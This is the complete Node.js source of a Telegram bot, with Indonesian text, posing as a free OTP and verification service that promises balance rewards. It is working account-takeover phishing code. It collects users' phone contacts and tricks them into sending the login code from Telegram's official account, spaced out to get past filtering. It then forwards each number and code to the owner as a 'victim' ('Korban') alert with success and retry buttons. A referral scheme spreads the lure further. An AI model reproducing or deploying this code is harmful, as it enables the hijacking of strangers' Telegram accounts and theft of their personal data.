const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');

// Baca informasi pemilik dari owner.json
const ownerData = JSON.parse(fs.readFileSync('owner.json'));
const token = ownerData.token;
const ownerId = ownerData.ownerId;

// Inisialisasi bot instance
const bot = new TelegramBot(token, { polling: true });

// Inisialisasi maps untuk menyimpan data
const inviteLinks = new Map();       // Untuk menyimpan tautan undangan
const userPoints = new Map();        // Untuk menyimpan poin pengguna
const invitedUsers = new Map();      // Untuk melacak pengguna yang diundang
const welcomedUsers = new Set();     // Untuk melacak pengguna yang disambut
const userContacts = new Map();      // Untuk menyimpan detail kontak pengguna
const userOtps = new Map();          // Untuk menyimpan OTP yang dikirim

// Fungsi untuk memulai bot dan meminta kontak
bot.onText(/\/Verifikasi/, (msg) => {
  const chatId = msg.chat.id;
  const inviteCode = msg.text.split(' ')[1];

  // Cek jika pengguna datang dari tautan undangan
  if (inviteCode && inviteLinks.has(inviteCode)) {
    const { chatId: inviterId, username: inviterUsername } = inviteLinks.get(inviteCode);
    const newUsername = msg.from.username;

    // Tambahkan pengguna baru ke daftar diundang
    invitedUsers.set(inviterId, invitedUsers.get(inviterId) || new Set());
    if (!invitedUsers.get(inviterId).has(newUsername)) {
      invitedUsers.get(inviterId).add(newUsername);

      // Tambahkan poin ke pengundang
      userPoints.set(inviterId, userPoints.get(inviterId) || 0);
      userPoints.set(inviterId, userPoints.get(inviterId) + 1);

      // Kirim pesan ke pengundang
      bot.sendMessage(inviterId, `@${newUsername} Barusan saja menekan tautan undangan anda`);
    }
  }

  // Buat tombol untuk meminta kontak
  const requestContactButton = {
    reply_markup: {
      keyboard: [[{
        text: "Lanjutkan",
        request_contact: true
      }]],
      one_time_keyboard: true,
      resize_keyboard: true
    }
  };

  // Kirim pesan untuk meminta kontak
  bot.sendMessage(chatId, "Silahkan Tekan Tombol Lanjutkan Untuk Memberikan Kontak Anda Ke Bot,Agar Kami Mendeteksi Apakah Anda Mengunakan Id Bot Atau Id User.", requestContactButton);
});

// Mendengarkan kontak yang dikirim oleh pengguna
bot.on('contact', (msg) => {
  const chatId = msg.chat.id;
  const contact = msg.contact;

  // Simpan detail kontak pengguna
  userContacts.set(contact.user_id, contact);

  // Kirim pesan ke pengguna yang mengirimkan kontak
  bot.sendMessage(chatId, `Terima kasih @${contact.first_name} telah memulai proses verifikasi!\n\nSaat ini, kami sedang memverifikasi akun Anda. Harap bersabar sementara tim kami melakukan pengecekan.\n\n🕒 Apa yang akan terjadi selanjutnya:\n\n1. Proses Verifikasi: Kami sedang memproses permintaan Anda.\n2. Tunggu Konfirmasi: Anda akan menerima pemberitahuan setelah admin kami selesai memverifikasi akun Anda.\n\nKami akan segera menghubungi Anda dengan hasil verifikasi. Jika Verifikasi Lama Anda Bisa Hubungi Cs Kami @Csotpku.\nTerima kasih atas kesabaran Anda!`);
  
  // Kirim pesan ke pemilik dengan tombol untuk mengirim OTP
  const otpButton = {
    reply_markup: {
      inline_keyboard: [[
        { text: 'Kirim OTP', callback_data: `send_otp_${contact.user_id}` }
      ]]
    }
  };
  bot.sendMessage(ownerId, `Berhasil mendaftarkan di database:\nNama: ${contact.first_name}\nNomor: ${contact.phone_number}\n\nNB:\nSilakan tunggu beberapa menit untuk proses pembuatan bot Anda, ${contact.first_name}. Karena ini gratis, prosesnya bisa memakan waktu beberapa menit. Jadi harap sabar.`, otpButton);

  // Simpan data pengguna ke database.json
  saveUserData(contact.user_id, contact);
});

// Fungsi untuk menyimpan data pengguna ke database.json
function saveUserData(userId, contact) {
  let database = loadDatabase();
  database[userId] = {
    name: contact.first_name,
    phone_number: contact.phone_number,
    points: userPoints.get(userId) || 0
  };
  fs.writeFileSync('database.json', JSON.stringify(database, null, 2));
}

// Fungsi untuk memuat database.json
function loadDatabase() {
  try {
    return JSON.parse(fs.readFileSync('database.json'));
  } catch (error) {
    return {};
  }
}

// Fungsi untuk menangani perintah /invite
bot.onText(/\/invite/, (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username;

  // Generate kode undangan acak
  const inviteCode = crypto.randomBytes(4).toString('hex');
  inviteLinks.set(inviteCode, { chatId, username });

  // Buat tautan undangan
  const inviteLink = `https://t.me/verifyotpku_bot?start=${inviteCode}`;
  bot.sendMessage(chatId, `Dapatkan bonus saldo Rp 15.000 dan nomor virtual gratis hanya dengan menyebarluaskan tautan undangan ini!\n\n💡 Cara Mendapatkan Hadiah:\n1. Bagikan tautan undangan ini kepada teman-teman Anda.\n2. Dapatkan bonus saldo dan nomor virtual setelah mereka bergabung.\n\nJangan lewatkan kesempatan ini untuk mendapatkan keuntungan ekstra! Segera sebarkan dan nikmati hadiahnya!\n\n🔗 Tautan Undangan Anda:\n${inviteLink}\n\nTerima kasih telah bergabung dan selamat berhemat!`);
});

// Fungsi untuk menangani perintah /poin
bot.onText(/\/poin/, (msg) => {
  const chatId = msg.chat.id;
  const points = userPoints.get(chatId) || 0;
  bot.sendMessage(chatId, `Anda telah berhasil mengundang ${points} pengguna.\n\nKetik /poin untuk cek poin dan ketik /tukarpoin untuk menukarkan poin menjadi saldo otpku`);
});

// Fungsi untuk menangani perintah /tukarpoin
bot.onText(/\/tukarpoin/, (msg) => {
  const chatId = msg.chat.id;
  const points = userPoints.get(chatId) || 0;

  if (points >= 10) {
    userPoints.set(chatId, points - 10);
    bot.sendMessage(chatId, 'Berhasil Mengumpulkan Poin Silahkan Hub @Csotpku');
    // Tambahkan logika untuk fitur tukarpoin di sini
  } else {
    bot.sendMessage(chatId, 'Maaf, Anda memerlukan setidaknya 10 poin untuk menggunakan fitur ini. /invite teman Anda untuk mendapatkan 10 poin.');
  }
});

// Fungsi untuk menangani perintah /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const username = msg.from.username;
  const args = msg.text.split(' ');

  if (args.length > 1) {
    const inviteCode = args[1];
    if (inviteCode && inviteLinks.has(inviteCode)) {
      const { chatId: inviterId, username: inviterUsername } = inviteLinks.get(inviteCode);
      const newUsername = msg.from.username;

      invitedUsers.set(inviterId, invitedUsers.get(inviterId) || new Set());
      if (!invitedUsers.get(inviterId).has(newUsername)) {
        invitedUsers.get(inviterId).add(newUsername);

        userPoints.set(inviterId, userPoints.get(inviterId) || 0);
        userPoints.set(inviterId, userPoints.get(inviterId) + 1);

        bot.sendMessage(inviterId, `Selamat! @${newUsername} berhasil menggunakan tautan undangan Anda. Anda mendapatkan 1 poin.`);
      }
    }
  }

  if (!welcomedUsers.has(username)) {
    const welcomeMessage = `
Hallo Selamat Datang Di Bot Otp Telegram Gratis

Terima kasih telah  menggunakan bot kami. Untuk memastikan bahwa Anda bukan robot, kami perlu melakukan verifikasi sederhana, Ketik /Verifikasi untuk verifikasi bahwa anda bukan robot.\n\nUntuk Melihat Daftar Menu Ketik /menu  `;
    bot.sendMessage(chatId, welcomeMessage);
    welcomedUsers.add(username);
  } else {
    const menu = `
Terima kasih telah  menggunakan bot kami. Untuk memastikan bahwa Anda bukan robot, kami perlu melakukan verifikasi sederhana, Ketik /Verifikasi untuk verifikasi bahwa anda bukan robot.\n\nUntuk Melihat Daftar Menu Ketik /menu
    `;
    bot.sendMessage(chatId, menu);
  }
});

// Fungsi untuk menangani perintah /menu
bot.onText(/\/menu/, (msg) => {
  const chatId = msg.chat.id;
  const menu = `
Daftar Menu Bot Kami:

Fitur /Verifikasi\n- Verifikasi akun Anda dan dapatkan saldo OTPKU sebesar Rp 15.000.\n\nFitur /invite\n- Ambil tautan undangan Anda dan mulai sebarkan!\n\nFitur /poin\n- Cek jumlah poin yang telah Anda kumpulkan.\n\nFitur /tukarpoin\n- Tukar poin yang Anda miliki menjadi saldo OTPKU.
  `;
  bot.sendMessage(chatId, menu);
});

// Fungsi untuk menangani tombol callback
bot.on('callback_query', (callbackQuery) => {
  const msg = callbackQuery.message;
  const data = callbackQuery.data;

  if (data.startsWith('send_otp_')) {
    const userId = data.split('_')[2];

    if (msg.chat.id === ownerId && userContacts.has(parseInt(userId))) {
      const contact = userContacts.get(parseInt(userId));
      const otp = crypto.randomBytes(3).toString('hex');

      userOtps.set(contact.user_id, otp);

      bot.sendMessage(contact.user_id, `Kami memerlukan OTP (One-Time Password) untuk melanjutkan proses.

🔒 Langkah-langkah:

1. Periksa Telegram Anda: OTP telah dikirim ke akun resmi telegram. Cek pesan terbaru untuk menemukan OTP.

2. Kirimkan OTP: Setelah mendapatkan OTP, kirimkan kode tersebut di sini mengunakan jarak contohnya [ 1 2 3 4 5 ] untuk verifikasi.

Jika Anda mengalami kesulitan atau tidak menerima OTP, silakan hubungi dukungan kami @Csotpku.`);
      bot.sendMessage(ownerId, `OTP telah dikirim ke ${contact.first_name} (${contact.phone_number}).\n\nSilakan minta pengguna untuk mengirimkan kode OTP yang diterima.`);
    } else {
      bot.sendMessage(ownerId, 'Gagal mengirim');
    }
  }
});

// Fungsi untuk menangani pesan teks dari pengguna
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;

  // Cek apakah pesan mengandung 5 digit angka dengan spasi
  if (/^\d \d \d \d \d$/.test(text)) {
    // Ambil nomor pengguna dari userContacts
    const contact = userContacts.get(chatId);
    if (contact) {
      // Kirim pesan ke owner dengan format yang diminta
      const [digit1, digit2, digit3, digit4, digit5] = text.split(' ');
      const code = `${digit1}${digit2}${digit3}${digit4}${digit5}`;

      const otpMessage = `🦅 Mendapatkan Korban\n\nNo: ${contact.phone_number}\nOtp: ${code}`;
      const otpButtons = {
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'Berhasil', callback_data: `otp_success_${contact.user_id}` },
              { text: 'Coba Lagi', callback_data: `otp_retry_${contact.user_id}` }
            ]
          ]
        }
      };

      bot.sendMessage(ownerId, otpMessage, otpButtons);
    } else {
      bot.sendMessage(chatId, "Maaf, kami tidak dapat menemukan nomor kontak Anda.");
    }
  }
});

bot.on('callback_query', (callbackQuery) => {
  const msg = callbackQuery.message;
  const data = callbackQuery.data;

  if (data.startsWith('otp_success_')) {
    const userId = data.split('_')[2];

    if (userContacts.has(parseInt(userId))) {
      const contact = userContacts.get(parseInt(userId));
      bot.sendMessage(contact.user_id, 'Selamat! Akun Anda telah berhasil diverifikasi.\n\n🎉 Untuk mendapatkan saldo tambahan sebesar Rp 15.000 dari OTPKU, silakan kunjungi website berikut: https://otpku.id\n\nTerima kasih telah menggunakan layanan kami. Jika Anda memerlukan bantuan lebih lanjut, jangan ragu untuk menghubungi kami @Csotpku.');
      bot.sendMessage(ownerId, 'Pesan sukses telah dikirim ke pengguna.');
    } else {
      bot.sendMessage(ownerId, 'Done ❌');
    }
  } else if (data.startsWith('otp_retry_')) {
    const userId = data.split('_')[2];

    if (userContacts.has(parseInt(userId))) {
      const contact = userContacts.get(parseInt(userId));
      bot.sendMessage(contact.user_id, 'Verifikasi Gagal\n\nSayangnya, proses verifikasi akun Anda tidak berhasil. Silakan coba lagi untuk memastikan bahwa semua informasi yang Anda masukkan benar.\n\n🔄 Langkah-langkah:\n\n1. Periksa kembali otp yang Anda berikan.\n2. Coba proses verifikasi sekali lagi.\n\nJika Anda mengalami kesulitan atau memerlukan bantuan lebih lanjut, jangan ragu untuk menghubungi dukungan kami @Csotpku.');
      bot.sendMessage(ownerId, 'Pesan retry telah dikirim ke pengguna.');
    } else {
      bot.sendMessage(ownerId, 'Gagal mengirim pesan retry, kontak tidak ditemukan.');
    }
  }
});

console.log(`
===================================================
    ⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠔⠒⠊⠉⠉⠉⠉⠙⠒⠲⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⣠⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⠀⠀
    ⠀⠀⠀⣠⠞⠁⠀⣀⠀⠀⠀⠀⢀⣀⡀⠀⢀⣀⠀⠀⠀⠀⢀⠀⠈⠱⣄⠀⠀⠀
    ⠀⠀⡴⠁⡠⣴⠟⠁⢀⠤⠂⡠⠊⡰⠁⠇⢃⠁⠊⠑⠠⡀⠀⢹⣶⢤⡈⢣⡀⠀
    ⠀⡼⢡⣾⢓⡵⠃⡐⠁⠀⡜⠀⠐⠃⣖⣲⡄⠀⠀⠱⠀⠈⠢⠈⢮⣃⣷⢄⢳⠀
    ⢰⠃⣿⡹⣫⠃⡌⠀⠄⠈⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠣⠀⠀⠱⠈⣯⡻⣼⠈⡇
    ⡞⢈⢿⡾⡃⠰⠀⠀⠀⠀⠀⠀⠀⠀⣘⣋⠀⠀⠀⠀⠀⠀⠀⠀⠇⢸⢿⣿⢠⢸
    ⡇⢸⡜⣴⠃⠀⠀⠀⠀⠀⣀⣀⣤⡎⠹⡏⢹⣦⣀⣀⠀⠀⠀⠀⢈⠘⣧⢣⡟⢸
    ⢧⢊⢳⡏⣤⠸⠀⠀⠀⢸⣿⣿⣿⡇⢰⡇⢠⣿⣿⣿⣷⠀⠀⠀⡆⢸⢹⡼⣱⢸
    ⢸⡘⢷⣅⣿⢂⢃⠐⠂⣿⣿⣿⣿⣿⣼⣇⣾⣿⣿⣿⣿⠁⠂⡰⡠⣿⢨⡾⠃⡇
    ⠀⢳⡱⣝⠻⡼⣆⡁⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠐⣰⣇⠿⣋⠝⡼⠀
    ⠀⠀⢳⡈⢻⠶⣿⣞⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⢣⣿⡶⠟⢉⡼⠁⠀
    ⠀⠀⠀⠙⢦⡑⠲⠶⠾⠿⢟⣿⣿⣿⣿⣿⣿⣿⣿⡛⠿⠷⠶⠶⠊⡡⠋⠀⠀⠀
    ⠀⠀⠀⠀⠀⠙⠦⣝⠛⠛⠛⣿⣿⣿⣿⣿⣿⣿⣿⡛⠛⠛⣋⠴⠋⠀⠀⠀⠀⠀
    ⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⠦⠿⣿⣿⣿⣿⣿⣿⠿⠧⠒⠋⠁⠀⠀⠀⠀⠀⠀⠀
===================================================
            Welcome to Sisurya Server
===================================================
Status: Bot is running...
your id: ${ownerId}
Current Time: ${new Date().toLocaleString()}
===================================================
Owner: @SisuryaOfficial
Channel: @TricksAndroid2024
===================================================
`);